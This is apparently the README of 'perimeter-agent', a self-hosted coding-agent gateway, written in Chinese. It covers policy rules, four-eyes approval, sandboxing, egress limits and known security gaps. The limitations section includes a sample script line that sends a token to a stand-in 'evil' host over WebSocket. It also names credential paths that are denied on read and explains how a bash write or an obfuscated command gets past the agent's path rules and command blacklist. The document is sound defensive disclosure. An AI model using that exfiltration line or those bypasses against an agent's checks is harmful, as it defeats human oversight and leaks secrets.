# perimeter-agent

> 可私有部署的持久 code agent；浏览器与 CLI 是同一会话的展示端。

浏览器 / CLI → 网关内 Pi Durable → 模型网关 → 上游；工具通过 ExecutionEnv 在 local / Docker / Pod 执行。agent 循环、策略、审批、SQLite 和模型凭据留在可信网关；沙箱只拿 git 代理配置。底层四个 Pi 包精确锁定 1.1.0，API 以 node_modules 的源码/类型为准。

## 30 秒跑起来

前置：Node ≥22.19，git。不需要全局安装 pi。

```bash
npm install
npm run demo
```

打开给出的地址，发送「修复登录超时的 bug」：改源码放行、改 CI 配置拒绝、git push 等人工审批（超时拒绝）。mock 模型经真实模型网关，clone/push 经真实 git 代理；不需要 API key。

```bash
npm test             # 快速单次测试
npm run test:bounded # 受控全量测试（带进程组隔离与 15m 硬超时看护）
npm run test:serial  # 受控真串行全量测试（--test-concurrency=1）
npm run typecheck
npm run attach -- --session <id> --url http://127.0.0.1:8787 --token demo-token --actor demo@local
npm run attach -- --session <id> --url http://127.0.0.1:8787 --bearer <jwt>
npm run gen:deploy
```

CLI 支持消息、`/steer 文本`、`/approve id allow|deny`、`/abort`。网页地址保留会话 id，刷新/重连得到当前快照。会话内置基于职责分离的四眼审批（Two-Person Rule）：角色区分为 owner、editor、approver 与 viewer；owner/editor 可发消息、插话、中止，但严禁审批本人发起的任务（防自批铁律），同一主体换不同凭证亦判定违规；approver 仅负责审批，禁止发起任务与管理 share；审批绑定完整意图 hash（argsHash，原文不泄露）与上下文快照（工作区 HEAD、策略规则 hash 与 ACL 版本），执行前执行双重核验，代码提交或成员变更即刻失效。demo 模式兼容既有 `npm run demo`；production 模式严禁默认共享 token 与自报身份，通过 OIDC/JWT（基于 `node:crypto`，支持 RS/ES 签名与 JWKS 轮换）验签，服务端组映射（`resolveScope`）决定 repo/team 访问权限，CLI 支持 `--bearer` 标头握手；浏览器通过 `POST /auth/session` 换取 HttpOnly/Secure/SameSite=Strict Cookie 配合严格 Origin 白名单（未实现 double-cookie 或 Header CSRF token；未实现浏览器 Authorization Code+PKCE 交互）。

真实模型：配置 PERIMETER_MODEL_GATEWAY_URL、PERIMETER_MODEL_PROXY_TOKEN、PERIMETER_MODEL，再运行 PERIMETER_DEMO_REAL=1 npm run demo。URL 必须指向模型网关；上游认证在模型网关配置，不进沙箱。eval CLI 同样读取这三个变量，审批默认拒绝，可用 --approve 比较审批成本；报告包含缓存命中率，未跑真实模型基线。

## 四条铁律

| 铁律 | 落地 | 边界 |
|---|---|---|
| 代码不离开 Data Plane | 审计只记参数 hash；SIEM 白名单 | command/summary 保留命令片段的既有例外；SIEM 默认不导出 |
| 凭据不进沙箱 | 模型调用在网关；local 工具强制 inheritEnv:false；沙箱 HOME 只有 git 配置 | gitProxyToken 与模型/浏览器 token 分离，HOME 在 workspace 外；local 无文件系统隔离 |
| egress 默认拒绝 | 生成 NetworkPolicy 仅放通 git 代理与 DNS | 仍是部署承诺：未 apply；Docker 默认 bridge 不成立，需要 internal 网络 |
| 每次工具调用过策略且留痕 | perimeter beforeTool，抛错 block，网关唯一审计写入者 | bash 路径规则不生效，命令黑名单不是安全边界 |

审批写 durable doc，默认拒绝。网关在审批中途崩溃：旧 pending 过期，恢复 call 阶段重发审批；执行意图已落盘的 unsafe 工具恢复为 interrupted，可能已有部分副作用。SQLite 不支持多进程共用，必须单实例独占；重启首次 attach reopen + resume，空闲关闭但保留 SQLite。

## 目录与约束

```text
src/runtime/   Harness、策略扩展、审批/作者 doc、ExecutionEnv 与模型目录
src/protocol/  自有 v2 类型与唯一事件转换点
src/gateway/   Hub、成员/在场、有界队列、沙箱生命周期
src/policy/    策略引擎
src/audit/     哈希链与 SIEM 白名单
src/modelgw/   上游 allowlist、认证、配额、缓存亲和透传
src/gitproxy/  git 凭据代理
src/evals/     golden task suite
web/           共享 reducer/labels 与零构建操作面
stateRoot/sessions/<id>/  meta.json、session.sqlite
```

运行时依赖白名单由 ws/yaml 扩为四个精确锁定的 Pi 包：持久 agent 在可信网关、远程工具采用 pi-env，这是放宽的理由；新增依赖仍有守卫。进度提交保持默认 100ms，后台压缩开启；易变状态不进入 system section，工具顺序固定，缓存命中率为 cacheRead/(input+cacheRead+cacheWrite)，零分母显示 —。

Docker 参考镜像只装 pi-env daemon。`docker build -t perimeter-sandbox:test -f deploy/sandbox.Dockerfile .`；容器保持只读根、非 root、drop ALL、no-new-privileges、资源上限与独占工作区。生产模式网关强制要求受支持隔离后端（docker 或 kubectl），坚决禁止 LocalBackend、allowLocal 参数绕过或 Docker 默认 bridge 出网；Linux bind mount 属主需与运行 uid/gid 匹配。K8s 创建/回收与静态 schema 已测，真实集群未测；镜像需含 tar，供 kubectl cp git 配置。四条真实模型通道、K8s、生产 egress 都未实证；生产网关已支持标准 JWT 验签与 Secure 会话 cookie，并已交付 S2 独立 approver 角色与防自批四眼审批机制；暂未接入真实客户企业 IdP Authorization Code + PKCE / SAML 联邦，亦未做水平扩展、共享 SQLite、Helm、多 SCM、monorepo。

## 边界与已知缺口

**能力边界（不是缺口，是设计上的取舍）：**

- **路径 deny 规则只对带 `path` 参数的非只读工具（write/edit 等）生效。** bash 按命令模式匹配，`echo x > .github/workflows/ci.yml` 在本引擎眼里没有路径。也就是说 `config/policy.yaml` 里那份 deny_paths 清单（CI、IaC、`.pi/**`、`AGENTS.md`、`.git/config`）**对 bash 写文件不成立**，只能靠命令黑名单兜 —— 而黑名单如下一条所述不是安全边界。要让路径规则真正统一，需要 Phase 2 在 FS 层（RemoteExecutionEnv）收口。`tests/redteam.test.ts` 里有一条测试专门断言这个局限。
- **只读工具豁免 deny_paths/审批，但凭据文件已被 `deny_reads` 拒绝（B1）。** `read package.json` 这类普通读取仍免审批（避免审批疲劳）；但 `read .env` / `read ~/.aws/credentials` 现在默认 deny（symlink 解析后按真实目标复判；多硬链接常规文件读写一并保守拒，因为另一链接位置无法确证）。这仍是策略层/进程内防线：不是 OS 边界，check-then-use 竞态仍在，bash 依旧看不见路径；强边界=容器只读挂载+敏感文件不挂载（B12 部署面验证，当前未实证）。
- **命令黑名单是启发式，不是安全边界。** shell 的求值方式（变量展开、base64、别名、间接调用）注定它可被绕过。真边界是 egress 默认 deny + 凭据不进沙箱 + 每会话独占沙箱 —— 后两条在 docker 后端下已成立，egress 那条仍取决于部署（见上）。`tests/redteam.test.ts` 里有一条测试**刻意断言黑名单拦不住**。
- **egress allowlist 即便部署了，也只杀掉「直连任意外部主机」这一类外泄。** 生成的策略必须放通 DNS（否则内部主机名都解析不了），DNS 隧道仍然可行；经模型网关的请求体本身也是一条合法外泄通道（凭据检测已在链路上：B3 起生产默认 block —— 完整 body 在任何上游副作用前扫描，高置信凭据 403 拒绝且上游零调用；audit 模式仅限显式获批低敏部署。对照集覆盖历史误报源（commit SHA/base64/UUID/占位符），但**真实误报率未经真实流量验证**，不得宣称零误报；DPA/零留存是外部合同，不因 block 模式视为已满足。携带凭据的出站 fetch（含 GCP 换 token）一律 `redirect:"error"` 逐跳拒绝重定向；hostname allowlist 不防 DNS 重绑定/SSRF，那要靠网络层）。
- **哈希链防的是意外损坏与粗糙篡改，不防有文件写权限的攻击者** —— 那种攻击者能从头重算整条链，也能截断尾部。要升级为防恶意篡改需要外部锚点（链头是纯元数据，可以出 Data Plane），`AuditLog.verify(path, expectedHead)` 已留入口，上报由部署侧接。安全白皮书里必须同口径表述，不要写成「防篡改」。
- **前端渲染的全部内容都是 agent 可控的**（模型输出、工具结果、命令原文）。一律走 `textContent`，不用 `innerHTML`/`eval`，CSP 限同源且 `connect-src` 不含 `ws:`/`wss:` 这类 scheme-source —— 后者匹配任意主机，注入的脚本一句 `new WebSocket("wss://evil/?t="+location.search)` 就能把 URL 里的 token 送走。这些性质由 `tests/web-injection.test.ts` 锁住（`web/` 是零构建原生 JS，类型系统与 lint 都够不着）。
- **PII/secret 检测：生产默认 block（B3），audit 仅限显式获批低敏部署。** 对代码流做正则/熵**改写**仍不做（误伤率高，会直接破坏生成质量）；block=拒绝整次请求，不改写、不透传。扫描器故障/超限 body fail-closed。



## 交接与实现记录

[handoff.md](docs/handoff.md) 记录铁律、坑和同步修改纪律；[重构规格 §9](docs/durable-rearchitecture.md#9-实现记录实现者填写) 记录 API 差异与取舍；[review-log.md](docs/review-log.md) 记录提交前审查。流程为实现 → subagent review → 修复 → 测试全绿 → 独立 commit；不 push。
